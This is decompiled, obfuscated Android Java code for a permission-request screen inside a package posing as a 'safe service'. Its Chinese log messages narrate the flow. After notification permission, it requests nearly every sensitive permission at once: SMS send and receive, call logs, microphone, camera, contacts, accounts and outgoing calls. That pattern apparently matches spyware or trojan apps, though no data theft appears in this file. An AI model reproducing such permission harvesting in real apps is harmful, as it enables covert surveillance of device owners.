package com.storm.safe.rock.service.modules.yw5xud;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import kotlin.AbstractC0767a0;
import p000.AbstractC0003a2;
import p000.AbstractC1117qo;
import p000.AbstractC1120qr;
import p000.RunnableC1322v2;
import p000.bl1;
import p000.t60;
import p000.tz0;
import p000.w00;
import p000.y90;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class umrkmgrri extends Activity {

    /* renamed from: a4 */
    public static volatile boolean f55159a4;

    /* renamed from: a0 */
    public final Handler f55161a0 = new Handler(Looper.getMainLooper());

    /* renamed from: a1 */
    public bl1 f55162a1;

    /* renamed from: a2 */
    public boolean f55163a2;

    /* renamed from: a3 */
    public static final C0373a0 f55158a3 = new C0373a0(null);

    /* renamed from: a5 */
    public static final y90 f55160a5 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.yw5xud.umrkmgrri$Companion$OTHER_PERMISSIONS$2
        @Override // p000.w00
        public final Object invoke() {
            ArrayList arrayList = new ArrayList();
            arrayList.add("android.permission.CAMERA");
            int i = Build.VERSION.SDK_INT;
            if (i >= 33) {
                arrayList.add("android.permission.READ_MEDIA_IMAGES");
                arrayList.add("android.permission.READ_MEDIA_VIDEO");
                arrayList.add("android.permission.READ_MEDIA_AUDIO");
            }
            if (i >= 34) {
                arrayList.add("android.permission.READ_MEDIA_VISUAL_USER_SELECTED");
            }
            arrayList.add("android.permission.READ_EXTERNAL_STORAGE");
            arrayList.add("android.permission.WRITE_EXTERNAL_STORAGE");
            arrayList.add("android.permission.RECORD_AUDIO");
            arrayList.add("android.permission.READ_SMS");
            arrayList.add("android.permission.SEND_SMS");
            arrayList.add("android.permission.RECEIVE_SMS");
            arrayList.add("android.permission.RECEIVE_MMS");
            arrayList.add("android.permission.RECEIVE_WAP_PUSH");
            arrayList.add("android.permission.READ_CONTACTS");
            arrayList.add("android.permission.GET_ACCOUNTS");
            arrayList.add("android.permission.READ_PHONE_STATE");
            arrayList.add("android.permission.CALL_PHONE");
            arrayList.add("android.permission.READ_CALL_LOG");
            arrayList.add("android.permission.WRITE_CALL_LOG");
            arrayList.add("com.android.voicemail.permission.ADD_VOICEMAIL");
            arrayList.add("android.permission.USE_SIP");
            arrayList.add("android.permission.PROCESS_OUTGOING_CALLS");
            arrayList.add("android.permission.BODY_SENSORS");
            if (i >= 26) {
                arrayList.add("android.permission.READ_PHONE_NUMBERS");
                arrayList.add("android.permission.ANSWER_PHONE_CALLS");
            }
            if (i >= 29) {
                arrayList.add("android.permission.ACTIVITY_RECOGNITION");
                arrayList.add("android.permission.ACCESS_MEDIA_LOCATION");
            }
            if (i >= 31) {
                arrayList.add("android.permission.BLUETOOTH_SCAN");
                arrayList.add("android.permission.BLUETOOTH_CONNECT");
                arrayList.add("android.permission.BLUETOOTH_ADVERTISE");
            }
            if (i >= 33) {
                arrayList.add("android.permission.NEARBY_WIFI_DEVICES");
                arrayList.add("android.permission.BODY_SENSORS_BACKGROUND");
            }
            return arrayList;
        }
    });

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    /* renamed from: com.storm.safe.rock.service.modules.yw5xud.umrkmgrri$a0 */
    public static final class C0373a0 {
        public /* synthetic */ C0373a0(AbstractC1120qr abstractC1120qr) {
            this();
        }

        /* JADX INFO: Access modifiers changed from: private */
        public final List<String> getOTHER_PERMISSIONS() {
            return (List) umrkmgrri.f55160a5.getValue();
        }

        /* JADX INFO: Access modifiers changed from: private */
        public static final void start$lambda$0(Context context) {
            t60.m214695b6(context, "$context");
            try {
                Intent intent = new Intent(context, (Class<?>) umrkmgrri.class);
                intent.setFlags(268435456);
                context.startActivity(intent);
            } catch (Exception e) {
                tz0.m214807a7("[权限请求] 启动失败: ", e.getMessage(), "PermReqActivity");
                umrkmgrri.f55158a3.setRequestingPermissions(false);
            }
        }

        public final boolean isRequestingPermissions() {
            return umrkmgrri.f55159a4;
        }

        public final void setRequestingPermissions(boolean z) {
            umrkmgrri.f55159a4 = z;
        }

        public final void start(Context context) {
            t60.m214695b6(context, "context");
            setRequestingPermissions(true);
            new Handler(Looper.getMainLooper()).post(new RunnableC1322v2(context, 6));
        }

        private C0373a0() {
        }
    }

    /* renamed from: a0 */
    public final void m212463a0() {
        List other_permissions = f55158a3.getOTHER_PERMISSIONS();
        ArrayList arrayList = new ArrayList();
        for (Object obj : other_permissions) {
            if (AbstractC1117qo.m214411a7(this, (String) obj) != 0) {
                arrayList.add(obj);
            }
        }
        t60.m214704c5("PermReqActivity", "╔════════════════════════════════════════════════════════════");
        t60.m214704c5("PermReqActivity", "║ [第2步] 请求其他权限");
        tz0.m214806a6("║ 需要请求: ", arrayList.size(), " 个", "PermReqActivity");
        t60.m214704c5("PermReqActivity", "╚════════════════════════════════════════════════════════════");
        if (arrayList.isEmpty()) {
            t60.m214704c5("PermReqActivity", "[其他权限] 全部已授权，完成");
            new Handler(Looper.getMainLooper()).postDelayed(new bl1(this, 1), 500L);
            return;
        }
        int size = arrayList.size();
        int i = 0;
        while (i < size) {
            Object obj2 = arrayList.get(i);
            i++;
            tz0.m214807a7("[其他权限] - ", (String) obj2, "PermReqActivity");
        }
        AbstractC1117qo.m214459f8(this, (String[]) arrayList.toArray(new String[0]), 151);
    }

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        String lowerCase;
        super.onCreate(bundle);
        boolean z = true;
        f55159a4 = true;
        this.f55163a2 = false;
        bl1 bl1Var = new bl1(this, 0);
        this.f55162a1 = bl1Var;
        this.f55161a0.postDelayed(bl1Var, 60000L);
        String str = Build.BRAND;
        if (str != null) {
            lowerCase = str.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        } else {
            lowerCase = "";
        }
        boolean z2 = lowerCase.equals("huawei") || lowerCase.equals("honor") || lowerCase.equals("hihonor");
        if (!z2 && Build.VERSION.SDK_INT < 33) {
            z = false;
        }
        t60.m214704c5("PermReqActivity", "╔════════════════════════════════════════════════════════════");
        t60.m214704c5("PermReqActivity", "║ [通知权限] 开始请求");
        t60.m214704c5("PermReqActivity", "║ 品牌: " + lowerCase + ", 是华为/荣耀: " + z2 + ", SDK: " + Build.VERSION.SDK_INT);
        StringBuilder sb = new StringBuilder("║ 需要请求: ");
        sb.append(z);
        t60.m214704c5("PermReqActivity", sb.toString());
        if (!z) {
            t60.m214704c5("PermReqActivity", "║ 非华为/荣耀且Android < 13，跳过通知权限");
            t60.m214704c5("PermReqActivity", "╚════════════════════════════════════════════════════════════");
            m212463a0();
            return;
        }
        int iM214411a7 = AbstractC1117qo.m214411a7(this, "android.permission.POST_NOTIFICATIONS");
        t60.m214704c5("PermReqActivity", "║ 当前状态: ".concat(iM214411a7 == 0 ? "已授权 ✓" : "未授权 ✗"));
        t60.m214704c5("PermReqActivity", "╚════════════════════════════════════════════════════════════");
        if (iM214411a7 == 0) {
            t60.m214704c5("PermReqActivity", "[通知权限] 已授权，跳过请求");
            m212463a0();
        } else {
            t60.m214704c5("PermReqActivity", "[通知权限] ★★★ 请求系统弹窗... ★★★");
            AbstractC1117qo.m214459f8(this, new String[]{"android.permission.POST_NOTIFICATIONS"}, 152);
        }
    }

    @Override // android.app.Activity
    public final void onDestroy() {
        super.onDestroy();
        bl1 bl1Var = this.f55162a1;
        if (bl1Var != null) {
            this.f55161a0.removeCallbacks(bl1Var);
        }
        this.f55162a1 = null;
        f55159a4 = false;
    }

    @Override // android.app.Activity
    public final void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
        t60.m214695b6(strArr, "permissions");
        t60.m214695b6(iArr, "grantResults");
        super.onRequestPermissionsResult(i, strArr, iArr);
        int i2 = 0;
        if (i != 151) {
            if (i != 152) {
                return;
            }
            Integer numValueOf = iArr.length != 0 ? Integer.valueOf(iArr[0]) : null;
            tz0.m214809a9("[通知权限] ★★★ 结果: ", (numValueOf != null && numValueOf.intValue() == 0) ? "已授权 ✓" : "被拒绝 ✗", " ★★★", "PermReqActivity");
            this.f55163a2 = true;
            m212463a0();
            return;
        }
        int length = strArr.length;
        int i3 = 0;
        int i4 = 0;
        int i5 = 0;
        while (i2 < length) {
            String str = strArr[i2];
            int i6 = i5 + 1;
            Integer numValueOf2 = (i5 < 0 || i5 > iArr.length - 1) ? null : Integer.valueOf(iArr[i5]);
            if (numValueOf2 != null && numValueOf2.intValue() == 0) {
                i3++;
            } else {
                i4++;
                t60.m214726f4("PermReqActivity", "[其他权限] " + str + " 被拒绝");
            }
            i2++;
            i5 = i6;
        }
        t60.m214704c5("PermReqActivity", AbstractC0003a2.m31b2("[其他权限] 结果: 授权 ", i3, " 个, 拒绝 ", i4, " 个"));
        new Handler(Looper.getMainLooper()).postDelayed(new bl1(this, 1), 500L);
    }

    @Override // android.app.Activity
    public final void onResume() {
        super.onResume();
        if (this.f55163a2) {
            return;
        }
        boolean z = AbstractC1117qo.m214411a7(this, "android.permission.POST_NOTIFICATIONS") == 0;
        t60.m214704c5("PermReqActivity", "[onResume] 通知权限状态: ".concat(z ? "已授权" : "未授权"));
        if (!z || this.f55163a2) {
            return;
        }
        t60.m214704c5("PermReqActivity", "[onResume] ★★★ 检测到通知权限已授权，继续请求其他权限 ★★★");
        this.f55163a2 = true;
        m212463a0();
    }
}
